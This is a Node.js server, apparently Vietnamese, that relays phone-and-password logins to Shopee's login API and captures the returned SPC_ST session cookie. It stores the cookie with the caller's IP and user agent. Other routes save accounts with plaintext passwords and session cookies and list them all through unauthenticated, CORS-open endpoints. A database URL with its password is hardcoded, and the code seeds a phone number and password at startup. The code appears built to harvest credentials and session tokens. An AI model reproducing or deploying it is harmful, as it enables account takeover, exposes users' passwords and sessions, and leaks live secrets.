const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { Pool } = require('pg');

// ==================== CONFIG ====================
const PORT = process.env.PORT || 3000;
const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://cookiedb_3atl_user:swCFgz5aOeYG5B5kY8YSRxaREybOrMRP@dpg-d9selc2fngtc73f6ne1g-a.singapore-postgres.render.com/cookiedb_3atl';

// ==================== DATABASE ====================
const pool = new Pool({
    connectionString: DATABASE_URL,
    ssl: {
        rejectUnauthorized: false
    }
});

// Chỉ kiểm tra kết nối, không tạo table
async function initDB() {
    const client = await pool.connect();
    try {
        await client.query('SELECT 1');
        console.log('✅ Database connected');
    } catch (err) {
        console.error('❌ DB Error:', err.message);
        throw err;
    } finally {
        client.release();
    }
}

// ⭐ Tự động insert test data bảng taikhoan khi khởi động
async function insertTestTaikhoan() {
    try {
        await pool.query(
            `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
             VALUES ($1, $2, $3, $4, $5, $6)`,
            [
                '84522420504',
                'test_user',
                'test@example.com',
                '123123aA',
                'I7kYsQ53aJZE0tJvNI64FzvNh8P1V41N',
                'SPC_ST=demo_cookie_value'
            ]
        );
        console.log('✅ Test data inserted into taikhoan');
    } catch (err) {
        console.error('❌ Insert test taikhoan error:', err.message);
    }
}

async function saveLog(phone, passwordHash, spcSt, shopeeStatus, shopeeResponse, req) {
    try {
        await pool.query(
            `INSERT INTO login_logs (phone, password_hash, spc_st, shopee_status, shopee_response, ip_address, user_agent)
             VALUES ($1, $2, $3, $4, $5, $6, $7)`,
            [
                phone,
                passwordHash,
                spcSt,
                shopeeStatus,
                JSON.stringify(shopeeResponse),
                req.headers['x-forwarded-for'] || req.socket.remoteAddress,
                req.headers['user-agent'] || null
            ]
        );
    } catch (err) {
        console.error('❌ Save log error:', err.message);
    }
}

// ==================== SHOPEE LOGIN ====================
function hashPassword(rawPassword) {
    const md5Hash = crypto.createHash('md5').update(rawPassword).digest('hex');
    return crypto.createHash('sha256').update(md5Hash).digest('hex');
}

function loginShopee(phone, rawPassword) {
    return new Promise((resolve, reject) => {
        const passwordHash = hashPassword(rawPassword);
        const payload = {
            client_identifier: { security_device_fingerprint: 'test9' },
            password: passwordHash,
            stay_logged_in: true,
            support_ivs: true,
            phone: phone
        };
        const data = JSON.stringify(payload);

        const options = {
            hostname: 'shopee.vn',
            path: '/api/v4/account/login_by_password',
            method: 'POST',
            headers: {
                'accept': 'application/json',
                'accept-language': 'vi,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'content-type': 'application/json',
                'content-length': Buffer.byteLength(data, 'utf8'),
                'cookie': 'SPC_F=I7kYsQ53aJZE0tJvNI64FzvNh8P1V41N',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0'
            }
        };

        const req = https.request(options, (res) => {
            let spcSt = null;
            const setCookie = res.headers['set-cookie'];

            if (Array.isArray(setCookie)) {
                const cookie = setCookie.find(c => c.trim().startsWith('SPC_ST='));
                if (cookie) spcSt = cookie.split(';')[0].replace('SPC_ST=', '');
            } else if (typeof setCookie === 'string' && setCookie.trim().startsWith('SPC_ST=')) {
                spcSt = setCookie.split(';')[0].replace('SPC_ST=', '');
            }

            const chunks = [];
            res.on('data', (chunk) => chunks.push(chunk));
            res.on('end', () => {
                const body = Buffer.concat(chunks).toString('utf8');
                let parsedBody;
                try { parsedBody = JSON.parse(body); }
                catch { parsedBody = { raw: body }; }

                resolve({
                    statusCode: res.statusCode,
                    spcSt: spcSt,
                    shopeeResponse: parsedBody,
                    passwordHash: passwordHash
                });
            });
        });

        req.on('error', reject);
        req.write(data);
        req.end();
    });
}

// ==================== SERVER ====================
function parseBody(req) {
    return new Promise((resolve, reject) => {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            try { resolve(body ? JSON.parse(body) : {}); }
            catch { reject(new Error('Invalid JSON body')); }
        });
    });
}

const server = http.createServer(async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, GET, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') {
        res.writeHead(204); res.end(); return;
    }

    // Health check
    if (req.method === 'GET' && req.url === '/health') {
        res.writeHead(200);
        res.end(JSON.stringify({ status: 'ok', uptime: process.uptime() }));
        return;
    }

    // ==================== ⭐ TAIKHOAN API ⭐ ====================

    // Thêm taikhoan mới
    if (req.method === 'POST' && req.url === '/taikhoan') {
        try {
            const body = await parseBody(req);
            const { phone, username, email, password, spc_f, spc_st } = body;

            const result = await pool.query(
                `INSERT INTO taikhoan (phone, username, email, password, spc_f, spc_st)
                 VALUES ($1, $2, $3, $4, $5, $6)
                 RETURNING *`,
                [
                    phone || null,
                    username || null,
                    email || null,
                    password || null,
                    spc_f || null,
                    spc_st || null
                ]
            );

            res.writeHead(200);
            res.end(JSON.stringify({ success: true, data: result.rows[0] }));

        } catch (err) {
            console.error('❌ Taikhoan insert error:', err.message);
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return;
    }

    // Lấy tất cả taikhoan
    if (req.method === 'GET' && req.url === '/taikhoan') {
        try {
            const result = await pool.query(
                'SELECT * FROM taikhoan ORDER BY id DESC'
            );
            res.writeHead(200);
            res.end(JSON.stringify({ success: true, count: result.rowCount, data: result.rows }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return;
    }

    // Lấy taikhoan theo id
    if (req.method === 'GET' && req.url.startsWith('/taikhoan/')) {
        try {
            const id = req.url.replace('/taikhoan/', '');
            const result = await pool.query(
                'SELECT * FROM taikhoan WHERE id = $1',
                [id]
            );

            if (result.rows.length === 0) {
                res.writeHead(404);
                res.end(JSON.stringify({ success: false, error: 'Not found' }));
                return;
            }

            res.writeHead(200);
            res.end(JSON.stringify({ success: true, data: result.rows[0] }));

        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return;
    }

    // ==================== ACCOUNT API (cũ) ====================

    if (req.method === 'POST' && req.url === '/account') {
        try {
            const body = await parseBody(req);
            const { phone, username, email, password, spc_f, spc_st } = body;

            if (!phone) {
                res.writeHead(400);
                res.end(JSON.stringify({ success: false, error: 'Thiếu phone (bắt buộc)' }));
                return;
            }

            const result = await pool.query(
                `INSERT INTO account (phone, username, email, password, spc_f, spc_st)
                 VALUES ($1, $2, $3, $4, $5, $6)
                 ON CONFLICT (phone) DO UPDATE SET
                    username = EXCLUDED.username,
                    email = EXCLUDED.email,
                    password = EXCLUDED.password,
                    spc_f = EXCLUDED.spc_f,
                    spc_st = EXCLUDED.spc_st,
                    updated_at = CURRENT_TIMESTAMP
                 RETURNING *`,
                [phone, username || null, email || null, password || null, spc_f || null, spc_st || null]
            );

            res.writeHead(200);
            res.end(JSON.stringify({ success: true, data: result.rows[0] }));

        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return;
    }

    if (req.method === 'GET' && req.url === '/accounts') {
        try {
            const result = await pool.query(
                'SELECT id, phone, username, email, spc_f, spc_st, created_at FROM account ORDER BY id DESC'
            );
            res.writeHead(200);
            res.end(JSON.stringify({ success: true, count: result.rowCount, data: result.rows }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return;
    }

    // ==================== LOGIN LOGS API ====================

    if (req.method === 'GET' && req.url === '/logs') {
        try {
            const result = await pool.query(
                'SELECT id, phone, spc_st, shopee_status, created_at FROM login_logs ORDER BY created_at DESC LIMIT 100'
            );
            res.writeHead(200);
            res.end(JSON.stringify({ success: true, data: result.rows }));
        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return;
    }

    if (req.method === 'POST' && req.url === '/login') {
        try {
            const body = await parseBody(req);
            const { phone, password } = body;

            if (!phone || !password) {
                res.writeHead(400);
                res.end(JSON.stringify({ success: false, error: 'Thiếu phone hoặc password' }));
                return;
            }

            console.log(`[${new Date().toISOString()}] Login: ${phone}`);
            const result = await loginShopee(phone, password);
            await saveLog(phone, result.passwordHash, result.spcSt, result.statusCode, result.shopeeResponse, req);

            res.writeHead(200);
            res.end(JSON.stringify({
                success: true,
                spcSt: result.spcSt,
                shopeeStatus: result.statusCode,
                shopeeResponse: result.shopeeResponse
            }, null, 2));

        } catch (err) {
            res.writeHead(500);
            res.end(JSON.stringify({ success: false, error: err.message }));
        }
        return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ success: false, error: 'Not found' }));
});

// Khởi động
initDB()
    .then(() => insertTestTaikhoan())
    .then(() => {
        server.listen(PORT, () => {
            console.log(`🚀 Server chạy tại http://localhost:${PORT}`);
            console.log('');
            console.log('📌 TAIKHOAN API:');
            console.log('   POST /taikhoan     - Thêm taikhoan');
            console.log('   GET  /taikhoan     - Xem tất cả taikhoan');
            console.log('   GET  /taikhoan/:id - Xem theo id');
            console.log('');
            console.log('📌 ACCOUNT API:');
            console.log('   POST /account  - Thêm/Sửa account');
            console.log('   GET  /accounts - Xem tất cả accounts');
            console.log('');
            console.log('📌 LOGIN API:');
            console.log('   POST /login  - Đăng nhập Shopee');
            console.log('   GET  /logs   - Xem lịch sử login');
            console.log('   GET  /health - Health check');
        });
    })
    .catch(err => {
        console.error('❌ Không thể khởi động:', err.message);
        process.exit(1);
    });

process.on('SIGTERM', () => {
    console.log('Shutting down...');
    pool.end();
    server.close(() => process.exit(0));
});